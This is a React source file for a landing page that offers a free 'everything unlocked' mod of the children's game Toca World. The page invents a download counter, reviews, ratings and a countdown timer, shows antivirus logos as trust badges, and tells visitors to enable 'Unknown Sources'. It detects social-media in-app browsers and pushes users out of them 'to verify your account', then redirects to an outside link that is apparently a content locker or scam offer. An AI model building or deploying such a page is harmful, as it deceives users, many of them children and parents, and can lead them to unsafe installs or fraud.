/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  Star, 
  CheckCircle2, 
  Download, 
  ShieldCheck, 
  Shield,
  Zap, 
  Gamepad2, 
  MessageSquare,
  Clock,
  Sparkles,
  X,
  Cloud,
  Smartphone,
  Settings,
  Play,
  Loader2
} from 'lucide-react';
import { motion, AnimatePresence, useScroll, useTransform } from 'motion/react';
import confetti from 'canvas-confetti';

export default function App() {
  const [timeLeft, setTimeLeft] = useState({ minutes: 9, seconds: 44 });
  const [downloadCount, setDownloadCount] = useState(246);
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [progress, setProgress] = useState(0);
  const [isInAppBrowser, setIsInAppBrowser] = useState(false);

  const { scrollYProgress } = useScroll();
  const y1 = useTransform(scrollYProgress, [0, 1], [0, -100]);
  const y2 = useTransform(scrollYProgress, [0, 1], [0, -200]);
  const y3 = useTransform(scrollYProgress, [0, 1], [0, -300]);
  const y4 = useTransform(scrollYProgress, [0, 1], [0, -400]);
  const y5 = useTransform(scrollYProgress, [0, 1], [0, -500]);

  // Handle progress animation when popup opens
  useEffect(() => {
    const ua = navigator.userAgent || navigator.vendor || (window as any).opera;
    const isInApp = /TikTok|FBAN|FBAV|Instagram|Messenger/i.test(ua);
    const isTest = typeof window !== 'undefined' && window.location.search.includes('test=true');
    setIsInAppBrowser(isInApp || isTest);
  }, []);

  useEffect(() => {
    if (isPopupOpen) {
      setProgress(0);
      const duration = 3000; // 3 seconds
      const interval = 30; // update every 30ms
      const step = 100 / (duration / interval);
      
      const timer = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(timer);
            return 100;
          }
          return Math.min(prev + step, 100);
        });
      }, interval);
      
      return () => clearInterval(timer);
    }
  }, [isPopupOpen]);

  // Countdown timer logic
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { minutes: prev.minutes - 1, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Simulate live download count
  useEffect(() => {
    const interval = setInterval(() => {
      setDownloadCount(prev => prev + Math.floor(Math.random() * 3) - 1);
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const reviews = [
    {
      id: 1,
      name: "Sofia R.",
      time: "1 hour ago",
      text: "\"OMG this actually works!! Got all the houses and characters unlocked immediately. Best thing ever!!! 😍\"",
      avatar: "https://api.dicebear.com/7.x/avataaars/svg?seed=Sofia"
    },
    {
      id: 2,
      name: "Jake T.",
      time: "3 hours ago",
      text: "\"Saw this on TikTok and tried it. Took 1 minute and now I have everything unlocked fr fr 🙌\"",
      avatar: "https://api.dicebear.com/7.x/avataaars/svg?seed=Jake"
    },
    {
      id: 3,
      name: "Sarah M.",
      time: "5 hours ago",
      text: "\"My daughter loves it! She built a huge city with everything unlocked. 100% recommend to every parent!\"",
      avatar: "https://api.dicebear.com/7.x/avataaars/svg?seed=Sarah"
    }
  ];

  const handleDownload = () => {
    if (progress < 100) return;
    
    // Celebration effect
    const duration = 3 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

    const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;

    const interval: any = setInterval(function() {
      const timeLeft = animationEnd - Date.now();

      if (timeLeft <= 0) {
        return clearInterval(interval);
      }

      const particleCount = 50 * (timeLeft / duration);
      confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
      confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
    }, 250);

    // Redirect after a short delay to let the user see the effect
    setTimeout(() => {
      window.location.href = 'https://checkapp.site/cl/i/82dj6r';
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-[#E0F7FA] font-sans text-[#2D3436] selection:bg-[#FF7675] selection:text-white relative overflow-x-hidden">
      {/* Animated Background Elements */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        {/* Floating Clouds */}
        <motion.div
          animate={{ x: [-100, 2000] }}
          style={{ y: y1 }}
          transition={{ duration: 60, repeat: Infinity, ease: "linear" }}
          className="absolute top-[10%] left-0 text-white/40"
        >
          <Cloud size={120} fill="currentColor" />
        </motion.div>
        <motion.div
          animate={{ x: [2000, -200] }}
          style={{ y: y2 }}
          transition={{ duration: 80, repeat: Infinity, ease: "linear" }}
          className="absolute top-[40%] right-0 text-white/30"
        >
          <Cloud size={160} fill="currentColor" />
        </motion.div>
        <motion.div
          animate={{ x: [-200, 2000] }}
          style={{ y: y3 }}
          transition={{ duration: 100, repeat: Infinity, ease: "linear" }}
          className="absolute bottom-[20%] left-0 text-white/20"
        >
          <Cloud size={200} fill="currentColor" />
        </motion.div>

        {/* Floating Circles/Bubbles */}
        {[...Array(6)].map((_, i) => (
          <motion.div
            key={i}
            animate={{ 
              y: [0, -40, 0],
              x: [0, 20, 0],
              scale: [1, 1.1, 1],
              rotate: [0, 180, 360]
            }}
            style={{ 
              y: i % 2 === 0 ? y1 : y2,
              top: `${15 + i * 15}%`,
              left: `${10 + i * 12}%`,
              width: `${40 + i * 20}px`,
              height: `${40 + i * 20}px`,
              backgroundColor: i % 2 === 0 ? '#81ECEC33' : '#FF767522',
              filter: 'blur(8px)'
            }}
            transition={{ 
              duration: 5 + i * 2, 
              repeat: Infinity, 
              ease: "easeInOut",
              delay: i * 1.5
            }}
            className="absolute rounded-full"
          />
        ))}

        {/* Floating Stars */}
        {[...Array(4)].map((_, i) => (
          <motion.div
            key={`star-${i}`}
            animate={{ 
              scale: [1, 1.5, 1],
              opacity: [0.2, 0.5, 0.2],
              rotate: [0, 90, 0]
            }}
            style={{ 
              y: i === 0 ? y2 : i === 1 ? y3 : i === 2 ? y4 : y5,
              top: `${20 + i * 20}%`,
              right: `${15 + i * 18}%`,
            }}
            transition={{ 
              duration: 4 + i, 
              repeat: Infinity, 
              ease: "easeInOut",
              delay: i * 2
            }}
            className="absolute text-[#FDCB6E]/30"
          >
            <Star size={32 + i * 8} fill="currentColor" />
          </motion.div>
        ))}
      </div>

      {/* Top Banner */}
      <div className="bg-[#FF7675] text-white py-2 px-4 flex items-center justify-center gap-2 text-sm font-bold sticky top-0 z-50 shadow-md">
        <Clock size={16} className="animate-pulse" />
        <span>Free offer expires in:</span>
        <div className="flex gap-1">
          <span className="bg-white text-[#FF7675] px-2 py-0.5 rounded tabular-nums">
            {timeLeft.minutes.toString().padStart(2, '0')}
          </span>
          <span>:</span>
          <span className="bg-white text-[#FF7675] px-2 py-0.5 rounded tabular-nums">
            {timeLeft.seconds.toString().padStart(2, '0')}
          </span>
        </div>
        <span className="ml-2">🔥 Claim Now!</span>
      </div>

      <main className="max-w-xl mx-auto px-4 py-8 flex flex-col items-center">
        {/* Live Status */}
        <div className="flex items-center gap-2 mb-4 animate-bounce">
          <div className="w-2 h-2 bg-red-500 rounded-full"></div>
          <span className="text-sm font-semibold text-[#636E72]">
            <span className="text-red-500">{downloadCount}</span> people are downloading right now!
          </span>
        </div>

        {/* Main Card */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white rounded-[40px] shadow-2xl overflow-hidden w-full border-4 border-white"
        >
          {/* Header Image Section */}
          <div className="relative h-48 bg-[#B2EBF2]">
            <img 
              src="https://i.postimg.cc/XY2Yxbtd/60f25e02b219fa78b145eed003532865.png" 
              alt="Toca World Background" 
              className="w-full h-full object-cover opacity-80"
              referrerPolicy="no-referrer"
            />
            <div className="absolute inset-0 bg-gradient-to-b from-transparent to-white/20"></div>
            
            {/* App Icon */}
            <div className="absolute -bottom-12 left-1/2 -translate-x-1/2">
              <div className="relative">
                <div className="w-24 h-24 rounded-3xl bg-white p-1 shadow-xl border-2 border-gray-100">
                  <img 
                    src="https://i.postimg.cc/02Vv1Cnf/l-Hmstw-WETw-Es-L2-Ct-B2J31Ehwj-Tj-R-rq.png" 
                    alt="Toca Icon" 
                    className="w-full h-full rounded-2xl bg-[#81ECEC]"
                    referrerPolicy="no-referrer"
                  />
                </div>
                <motion.div 
                  animate={{ 
                    scale: [1, 1.1, 1],
                    rotate: [0, -5, 5, 0]
                  }}
                  transition={{ 
                    duration: 2, 
                    repeat: Infinity,
                    ease: "easeInOut"
                  }}
                  className="absolute -top-3 -right-6 bg-gradient-to-r from-[#FF7675] to-[#D63031] text-white text-[10px] font-black px-3 py-1 rounded-full shadow-xl border-2 border-white uppercase tracking-widest flex items-center gap-1"
                >
                  <Sparkles size={10} fill="currentColor" />
                  MOD
                </motion.div>
              </div>
            </div>
          </div>

          {/* Content Section */}
          <div className="pt-16 pb-8 px-6 flex flex-col items-center text-center">
            <h1 className="text-3xl font-black text-[#2D3436] mb-1">Toca World</h1>
            <p className="text-[#00CEC9] font-bold text-sm mb-4 uppercase tracking-wide">
              v1.126.1 • EVERYTHING UNLOCKED
            </p>

            {/* Rating */}
            <div className="flex items-center gap-1 mb-6">
              {[...Array(5)].map((_, i) => (
                <Star key={i} size={16} fill="#FDCB6E" color="#FDCB6E" />
              ))}
              <span className="text-sm font-bold text-[#636E72] ml-1">4.9 (2.1M ratings)</span>
            </div>

            {/* Features Grid */}
            <div className="grid grid-cols-2 gap-3 w-full mb-6">
              {[
                "All Houses Unlocked",
                "All Characters",
                "All Furniture",
                "100% Free"
              ].map((feature, i) => (
                <div key={i} className="flex items-center gap-2 bg-[#F5F6FA] px-3 py-2 rounded-xl border border-gray-100">
                  <CheckCircle2 size={16} className="text-[#00CEC9]" />
                  <span className="text-[11px] font-bold text-[#2D3436] whitespace-nowrap">{feature}</span>
                </div>
              ))}
            </div>

            {/* Social Proof Box */}
            <div className="bg-[#E3F2FD] border border-[#BBDEFB] rounded-2xl p-3 w-full mb-8 flex items-center gap-3">
              <div className="flex -space-x-2">
                {[1, 2, 3, 4].map(i => (
                  <img 
                    key={i}
                    src={`https://api.dicebear.com/7.x/avataaars/svg?seed=${i}`} 
                    className="w-8 h-8 rounded-full border-2 border-white bg-white"
                    alt="User"
                    referrerPolicy="no-referrer"
                  />
                ))}
              </div>
              <div className="text-left">
                <p className="text-[11px] font-bold text-[#0984E3]">
                  +12,847 people claimed this today!
                </p>
                <p className="text-[10px] font-medium text-[#636E72]">
                  Last claimed 2 minutes ago
                </p>
              </div>
            </div>

            {/* CTA Button */}
            <div className="w-full relative group">
              {/* Floating Sparkles on Hover */}
              <div className="absolute -inset-4 pointer-events-none opacity-0 group-hover:opacity-100 transition-opacity duration-500">
                <motion.div
                  animate={{ 
                    y: [0, -20, 0],
                    x: [0, 10, 0],
                    scale: [1, 1.2, 1],
                    rotate: [0, 45, 0]
                  }}
                  transition={{ duration: 3, repeat: Infinity }}
                  className="absolute top-0 left-1/4 text-yellow-400"
                >
                  <Sparkles size={20} fill="currentColor" />
                </motion.div>
                <motion.div
                  animate={{ 
                    y: [0, -15, 0],
                    x: [0, -10, 0],
                    scale: [1, 1.1, 1],
                    rotate: [0, -30, 0]
                  }}
                  transition={{ duration: 2.5, repeat: Infinity, delay: 0.5 }}
                  className="absolute bottom-0 right-1/4 text-yellow-400"
                >
                  <Sparkles size={16} fill="currentColor" />
                </motion.div>
              </div>

              <motion.button
                animate={{ 
                  scale: [1, 1.02, 1],
                  boxShadow: [
                    "0 8px 0 rgb(192,57,43)",
                    "0 12px 24px rgba(214,48,49,0.4), 0 8px 0 rgb(192,57,43)",
                    "0 8px 0 rgb(192,57,43)"
                  ]
                }}
                transition={{ 
                  duration: 2, 
                  repeat: Infinity,
                  ease: "easeInOut"
                }}
                whileHover={{ 
                  scale: 1.05,
                  y: -4,
                  transition: { duration: 0.2 }
                }}
                whileTap={{ scale: 0.95, y: 4, boxShadow: "0 2px 0 rgb(192,57,43)" }}
                onClick={() => setIsPopupOpen(true)}
                className="relative w-full bg-gradient-to-r from-[#FF7675] via-[#D63031] to-[#FF7675] bg-[length:200%_auto] text-white py-4 rounded-2xl font-black text-xl shadow-[0_6px_0_rgb(192,57,43)] mb-6 flex flex-col items-center justify-center gap-0.5 overflow-hidden border-2 border-white/20"
              >
                <div className="flex items-center gap-2.5">
                  <Gamepad2 size={24} className="group-hover:rotate-12 transition-transform duration-300" />
                  <span>INSTALL MOD FREE</span>
                </div>
                <span className="text-[9px] font-bold uppercase tracking-[0.2em] opacity-80">
                  Everything Unlocked • v1.126.1
                </span>
                
                {/* Shimmer Effect */}
                <motion.div 
                  animate={{ x: ['-100%', '200%'] }}
                  transition={{ repeat: Infinity, duration: 2, ease: "linear" }}
                  className="absolute top-0 left-0 w-1/2 h-full bg-gradient-to-r from-transparent via-white/30 to-transparent skew-x-12 pointer-events-none"
                />

                {/* Inner Glow */}
                <div className="absolute inset-0 shadow-[inset_0_1px_1px_rgba(255,255,255,0.4)] pointer-events-none rounded-[22px]"></div>
              </motion.button>
            </div>

            {/* Trust Badges */}
            <div className="flex flex-wrap justify-center items-center gap-x-6 gap-y-2 text-xs font-bold text-[#B2BEC3]">
              <div className="flex items-center gap-1.5">
                <Shield size={16} className="text-[#FDCB6E]" />
                Safe & Virus Free
              </div>
              <div className="flex items-center gap-1.5">
                <Zap size={16} className="text-[#FDCB6E]" />
                Instant Download
              </div>
              <div className="flex items-center gap-1.5">
                <ShieldCheck size={16} className="text-[#00CEC9]" />
                Verified Mod
              </div>
            </div>

            {/* How to Use Section */}
            <div className="mt-12 w-full text-left">
              <div className="flex items-center gap-2 mb-6 justify-center">
                <div className="h-[2px] w-8 bg-[#B2BEC3]/30"></div>
                <h3 className="text-sm font-black text-[#636E72] uppercase tracking-[0.2em]">How to Use</h3>
                <div className="h-[2px] w-8 bg-[#B2BEC3]/30"></div>
              </div>

              <div className="space-y-4">
                {[
                  {
                    icon: <Smartphone size={20} className="text-[#FF7675]" />,
                    title: "Step 1: Click Install",
                    desc: "Tap the big red button above to prepare your secure mod file."
                  },
                  {
                    icon: <Settings size={20} className="text-[#00CEC9]" />,
                    title: "Step 2: Allow Access",
                    desc: "If prompted, enable 'Unknown Sources' in your device settings."
                  },
                  {
                    icon: <Play size={20} className="text-[#FDCB6E]" />,
                    title: "Step 3: Start Playing",
                    desc: "Open Toca World and enjoy all houses, characters, and items unlocked!"
                  }
                ].map((step, i) => (
                  <motion.div 
                    key={i}
                    initial={{ opacity: 0, x: -20 }}
                    whileInView={{ opacity: 1, x: 0 }}
                    viewport={{ once: true }}
                    transition={{ delay: i * 0.1 }}
                    className="flex items-start gap-4 bg-[#F5F6FA] p-4 rounded-2xl border border-gray-100 group hover:border-[#FF7675]/30 transition-colors"
                  >
                    <div className="bg-white p-2.5 rounded-xl shadow-sm group-hover:scale-110 transition-transform">
                      {step.icon}
                    </div>
                    <div>
                      <h4 className="text-sm font-black text-[#2D3436] mb-0.5">{step.title}</h4>
                      <p className="text-[11px] font-medium text-[#636E72] leading-relaxed">{step.desc}</p>
                    </div>
                  </motion.div>
                ))}
              </div>
            </div>
          </div>
        </motion.div>

        {/* Reviews Section */}
        <div className="w-full mt-12">
          <div className="flex items-center justify-center gap-2 mb-6">
            <MessageSquare size={20} className="text-[#636E72]" />
            <h2 className="text-xl font-black text-[#2D3436]">What Players Say</h2>
          </div>

          <div className="space-y-4">
            {reviews.map((review, i) => (
              <motion.div 
                key={review.id}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: i * 0.1 }}
                className="bg-white p-5 rounded-3xl shadow-lg border border-white"
              >
                <div className="flex items-center gap-1 mb-2">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} size={14} fill="#FDCB6E" color="#FDCB6E" />
                  ))}
                </div>
                <p className="text-sm font-medium text-[#2D3436] mb-4 leading-relaxed italic">
                  {review.text}
                </p>
                <div className="flex items-center gap-3">
                  <img 
                    src={review.avatar} 
                    alt={review.name} 
                    className="w-10 h-10 rounded-full bg-gray-100"
                    referrerPolicy="no-referrer"
                  />
                  <div>
                    <p className="text-xs font-black text-[#2D3436]">{review.name}</p>
                    <p className="text-[10px] font-bold text-[#B2BEC3]">{review.time}</p>
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </div>

        {/* Footer Trust Logos */}
        <div className="mt-12 flex items-center gap-8 opacity-40 grayscale hover:grayscale-0 transition-all">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Norton_by_Symantec_logo.svg/1280px-Norton_by_Symantec_logo.svg.png" 
            alt="Norton" 
            className="h-6"
            referrerPolicy="no-referrer"
          />
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/McAfee_logo.svg/1280px-McAfee_logo.svg.png" 
            alt="McAfee" 
            className="h-6"
            referrerPolicy="no-referrer"
          />
        </div>
      </main>
      {/* Download Popup */}
      <AnimatePresence>
        {isPopupOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsPopupOpen(false)}
              className="absolute inset-0 bg-[#1A1B23]/80 backdrop-blur-sm"
            />

            {/* Modal */}
            <motion.div
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative bg-white rounded-[32px] p-8 w-full max-w-md shadow-2xl flex flex-col items-center text-center"
            >
              {/* Close Button */}
              <button 
                onClick={() => setIsPopupOpen(false)}
                className="absolute top-4 right-4 p-2 bg-[#F5F6FA] rounded-full text-[#B2BEC3] hover:text-[#2D3436] transition-colors"
              >
                <X size={20} />
              </button>

              <div className="flex items-center gap-2 mb-6">
                <Zap size={24} className="text-[#FF7675]" fill="currentColor" />
                <h2 className="text-2xl font-black text-[#2D3436]">Almost Ready...</h2>
              </div>

              {/* Progress Bar Container */}
              <div className="w-full h-4 bg-[#F5F6FA] rounded-full overflow-hidden mb-4 border border-gray-100">
                <motion.div 
                  initial={{ width: "0%" }}
                  animate={{ width: `${progress}%` }}
                  transition={{ type: "spring", bounce: 0, duration: 0.1 }}
                  className="h-full bg-gradient-to-r from-[#FF7675] to-[#D63031]"
                />
              </div>

              <div className="text-xl font-black text-[#FF7675]">
                {Math.floor(progress)}
              </div>

              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ 
                  opacity: progress === 100 ? 1 : 0.5, 
                  y: progress === 100 ? 0 : 10,
                  pointerEvents: progress === 100 ? "auto" : "none"
                }}
                className="mt-6 w-full"
              >
                <button 
                  disabled={progress < 100}
                  className={`w-full py-4 rounded-2xl font-black text-lg transition-all flex items-center justify-center gap-2 ${
                    progress === 100 
                      ? "bg-[#00CEC9] text-white shadow-[0_6px_0_rgb(0,184,148)] hover:brightness-110 active:translate-y-1 active:shadow-none" 
                      : "bg-[#B2BEC3] text-white cursor-not-allowed"
                  }`}
                  onClick={handleDownload}
                >
                  {progress < 100 ? (
                    <>
                      <Loader2 size={20} className="animate-spin" />
                      <span>WAITING...</span>
                    </>
                  ) : (
                    "DOWNLOAD NOW"
                  )}
                </button>
                <p className="text-[10px] font-bold text-[#B2BEC3] mt-4 uppercase tracking-widest">
                  File Size: 482 MB • Secure Connection
                </p>
              </motion.div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* TikTok Browser Popup */}
      <AnimatePresence>
        {isInAppBrowser && (
          <div id="ios-popup" className="fixed inset-0 z-[9999] flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/95 backdrop-blur-xl" 
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative bg-white rounded-[40px] p-8 w-full max-w-sm flex flex-col items-center text-center shadow-[0_0_50px_rgba(0,206,201,0.3)] border-4 border-[#00CEC9]"
            >
              <div className="w-full aspect-video rounded-3xl overflow-hidden mb-8 bg-gray-100 shadow-inner border-2 border-gray-50">
                <img 
                  src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" 
                  alt="Instructions" 
                  className="w-full h-full object-cover"
                  referrerPolicy="no-referrer"
                />
              </div>
              <p className="text-xl font-bold text-[#2D3436] leading-relaxed mb-6">
                Tap the three dots <span className="text-2xl font-black text-[#FF7675]">(···)</span> at the top and select <span className="text-[#00CEC9] font-black underline decoration-2 underline-offset-4">"Open in Browser"</span> to verify your account and claim rewards.
              </p>
              
              <button 
                onClick={() => setIsInAppBrowser(false)}
                className="text-xs font-black text-[#B2BEC3] uppercase tracking-[0.3em] hover:text-[#FF7675] transition-colors py-2"
              >
                Dismiss
              </button>

              {/* Decorative elements */}
              <div className="absolute -top-4 -right-4 bg-[#FF7675] text-white p-3 rounded-2xl shadow-lg rotate-12">
                <Sparkles size={20} fill="currentColor" />
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
